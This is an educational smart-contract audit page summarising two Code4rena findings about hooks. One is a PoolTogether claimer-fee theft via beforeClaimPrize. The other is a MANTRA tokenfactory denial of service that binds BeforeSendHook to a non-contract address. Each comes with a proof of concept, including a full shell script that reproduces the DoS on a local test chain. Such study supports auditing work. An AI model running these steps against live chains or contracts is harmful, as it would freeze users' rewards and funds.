# ETAAcademy-Adudit: 3. Hooks

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>03. Hooks</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>hooks</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] The winner can steal claimer fees, and force him to pay for the gas

### Use hooks to claim prize without fees

- Summary: To avoid paying transaction fees, a user can exploit a vulnerability in the Claimer contract. They can create a hook function, beforeClaimPrize, which allows them to claim their prize without paying fees and return their address. When the Claimer contract attempts to claim the prize, it fails as it has already been claimed. Using a MEV searcher, the user can then claim multiple prizes, including their own, without paying fees.

- Impact & Recommendation: One of the defense against the described attack is to check the gas cost of calling the beforeClaimPrize hook. By verifying if the prize state changes from unclaimed to claimed after the hook is called, transactions can be reverted if such a change occurs, thus preventing the attack from succeeding.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#m-01-the-winner-can-steal-claimer-fees-and-force-him-to-pay-for-the-gas) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    import { console2 } from "forge-std/console2.sol";
    import { PrizePoolMock } from "../contracts/mock/PrizePoolMock.sol";
    contract Auditor_MockPrizeToken {
        mapping(address user => uint256 balance) public balanceOf;
        function mint(address user, uint256 amount) public {
            balanceOf[user] += amount;
        }
        function burn(address user, uint256 amount) public {
            balanceOf[user] -= amount;
        }
    }
    contract Auditor_PrizePoolMock {
        Auditor_MockPrizeToken public immutable prizeToken;
        constructor(address _prizeToken) {
            prizeToken = Auditor_MockPrizeToken(_prizeToken);
        }
        // The reward is fixed to 100 tokens
        function claimPrize(
            address winner,
            uint8 /* _tier */,
            uint32 /* _prizeIndex */,
            address /* recipient */,
            uint96 reward,
            address rewardRecipient
        ) public returns (uint256) {
            // Distribute rewards if the PrizePool earns a reward
            if (prizeToken.balanceOf(address(this)) >= 100e18) {
                prizeToken.mint(winner, 100e18 - uint256(reward)); // Transfer reward tokens to the winner
                // Transfer fees to the claimer Receipent.
                // Instead of adding balance to the PrizePool contract and then the claimerRecipent
                // Can withdraw it, we will transfer it to the claimerRecipent directly in our simulation
                prizeToken.mint(rewardRecipient, reward);
                // Simulating Token transfereing by minting and burning
                prizeToken.burn(address(this), 100e18);
            } else {
                return 0;
            }
            return uint256(100e18);
        }
    }
    contract Auditor_Claimer {
        ClaimableWrapper public immutable prizeVault;
        constructor(address _prizeVault) {
            prizeVault = ClaimableWrapper(_prizeVault);
        }
        function claimPrizes(
            address[] calldata _winners,
            uint8 _tier,
            uint256 _claimerFees,
            address _feeRecipient
        ) external {
            for (uint i = 0; i < _winners.length; i++) {
                prizeVault.claimPrize(_winners[i], _tier, 0, uint96(_claimerFees), _feeRecipient);
            }
        }
    }

  ```

  </details>

## 2.[Medium] BlockBeforeSend hook can be exploited to perform a denial of service

### Token hook

- Summary: In MANTRA’s tokenfactory module, MsgSetBeforeSendHook allows token creators to set a BeforeSendHook for a specific token and bind it to a CosmWasm contract address. The contract’s Sudo logic determines whether token transfers succeed. A malicious token creator can bind the BeforeSendHook to an invalid address (e.g., an EOA account), causing all transfers of that token to fail. If the token is used in critical operations such as staking rewards distribution or ABCI processes, it can result in a Denial of Service (DoS) attack.

- Impact & Recommendation: Introduce a whitelist or access control mechanism to restrict BeforeSendHook registration to only trusted users with appropriate permissions.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-11-mantra-chain#h-01-blockbeforesend-hook-can-be-exploited-to-perform-a-denial-of-service) & [Report](https://code4rena.com/reports/2024-11-mantra-chain)

  <details><summary>POC</summary>

  ```makefile

  poc: build
  @echo "starting POC.."

  # clear port 26657 if old process still running
  @if lsof -i :26657; then \
  	kill -9 $$(lsof -t -i :26657) || echo "cannot kill process"; \
  fi

  # remove old setup and init new one
  @rm -rf .mantrapoc
  @mkdir -p .mantrapoc

  ./build/mantrachaind init poc-test --chain-id test-chain --home .mantrapoc
  ./build/mantrachaind keys add validator --keyring-backend test --home .mantrapoc
  ./build/mantrachaind keys add validator2 --keyring-backend test --home .mantrapoc

  # create alice and bob account
  ./build/mantrachaind keys add alice --keyring-backend test --home .mantrapoc
  ./build/mantrachaind keys add bob --keyring-backend test --home .mantrapoc
  ./build/mantrachaind genesis add-genesis-account $$(./build/mantrachaind keys show validator -a --keyring-backend test --home .mantrapoc) 500000000000stake --home .mantrapoc
  ./build/mantrachaind genesis add-genesis-account $$(./build/mantrachaind keys show validator2 -a --keyring-backend test --home .mantrapoc) 500000000000stake --home .mantrapoc
  ./build/mantrachaind genesis add-genesis-account $$(./build/mantrachaind keys show alice -a --keyring-backend test --home .mantrapoc) 500000000000stake --home .mantrapoc
  ./build/mantrachaind genesis add-genesis-account $$(./build/mantrachaind keys show bob -a --keyring-backend test --home .mantrapoc) 500000000000stake --home .mantrapoc

  ./build/mantrachaind genesis gentx validator 100000000stake --chain-id test-chain --keyring-backend test --home .mantrapoc
  # ./build/mantrachaind genesis gentx validator2 100000000stake --chain-id test-chain --keyring-backend test --home .mantrapoc


  ./build/mantrachaind genesis collect-gentxs --home .mantrapoc
  # start node
  ./build/mantrachaind start --home .mantrapoc --minimum-gas-prices 0stake

  ```

  ```bash
    export ALICE=`mantrachaind keys show alice --keyring-backend test --home .mantrapoc -a`
    export BOB=`mantrachaind keys show bob --keyring-backend test --home .mantrapoc -a`
    export VAL_BECH32=`mantrachaind keys show validator --keyring-backend test --home .mantrapoc -a`
    # export VAL2_BECH32=`mantrachaind keys show validator2 --keyring-backend test --home .mantrapoc -a`
    export VAL=$(mantrachaind q staking validators --output json | jq -r '.validators[0].operator_address')

    echo "alice create x/tokenfactory denom"
    mantrachaind tx tokenfactory create-denom foo --from alice --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    export DENOM=`echo "factory/$ALICE/foo"`

    echo "alice mint some tokens"
    mantrachaind tx tokenfactory mint 10000$DENOM --from alice --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    # double check tokens minted
    mantrachaind q bank balance $ALICE $DENOM

    echo "bob delegate funds to validator"
    mantrachaind tx staking delegate $VAL 100000000stake --from bob --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    # double check delegation succeeded
    mantrachaind q staking delegation $BOB $VAL

    echo "alice fund the minted tokens to validator rewards pool"
    mantrachaind tx distribution fund-validator-rewards-pool $VAL 10000$DENOM --from alice --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    echo "alice sets before send hook to dummy address, forcing all transfers to fail"
    mantrachaind tx tokenfactory set-before-send-hook $DENOM $ALICE --from alice --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    echo "Wait some time for injected rewards to accrue for delegators"
    echo "validator rewards:"
    mantrachaind q distribution rewards $VAL_BECH32

    echo "delegator rewards:"
    mantrachaind q distribution rewards $BOB

    # validators and delegators should be able to claim rewards, however it fails due to BlockBeforeSend hook
    # rpc error: code = Unknown desc = rpc error: code = Unknown desc = failed to execute message; message index: 0: failed to call before send hook for denom factory/mantra1k3uf5anqxefvuck455jgzasaagwpkt5483zv4m/foo: address mantra1k3uf5anqxefvuck455jgzasaagwpkt5483zv4m: no such contract [CosmWasm/wasmd@v0.53.0/x/wasm/types/errors.go:156] with gas used: '135697': unknown request

    echo "=========================================================="
    echo "        validator tries to withdraw rewards"
    echo "=========================================================="

    mantrachaind tx distribution withdraw-all-rewards --from validator --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    echo "=========================================================="
    echo "        delegator tries to withdraw rewards"
    echo "=========================================================="

    mantrachaind tx distribution withdraw-all-rewards --from bob --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    echo "=========================================================="
    echo "        delegator tries to delegate more tokens"
    echo "=========================================================="

    mantrachaind tx staking delegate $VAL 10stake --from bob --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    echo "=========================================================="
    echo "        delegator tries to unbond"
    echo "=========================================================="

    mantrachaind tx staking unbond $VAL 10stake --from bob --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    echo "=========================================================="
    echo "        delegator tries to redelegate"
    echo "=========================================================="

    echo '{"pubkey": {"@type":"/cosmos.crypto.ed25519.PubKey","key":"oWg2ISpLF405Jcm2vXV+2v4fnjodh6aafuIdeoW+rUw="},"amount": "1000000stake","moniker": "myvalidator","identity": "optional identity signature (ex. UPort or Keybase)","website": "validator'\''s (optional) website","security": "validator'\''s (optional) security contact email","details": "validator'\''s (optional) details","commission-rate": "0.1","commission-max-rate": "0.2","commission-max-change-rate": "0.01","min-self-delegation": "1"}' > validator.json

    TX_RESPONSE=$(mantrachaind tx staking create-validator ./validator.json --from validator2 --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto --output json)

    sleep 2

    # echo $TX_RESPONSE

    TX_HASH=$(echo "$TX_RESPONSE" | jq -r '.txhash')

    # echo $TX_HASH

    # parse validator address
    VAL2=$(mantrachaind q tx $TX_HASH --output json | jq -r '.events[] | select(.type=="create_validator") | .attributes[] | select(.key=="validator") | .value')


    mantrachaind tx staking redelegate $VAL $VAL2 10stake --from bob --keyring-backend test --home .mantrapoc --chain-id test-chain -y --fees 1000000stake --gas auto

    sleep 2

    # a chain halt could occur if the validator is slashed while having a redelegation, as the error is returned back to ABCI
    # BeginBlock -> x/evidence, x/slashing BeginBlocker -> handleEquivocationEvidence/HandleValidatorSignature -> SlashWithInfractionReason -> Slash -> SlashRedelegation -> Unbond -> BeforeDelegationSharesModified -> withdrawDelegationRewards -> error
  ```

  </details>
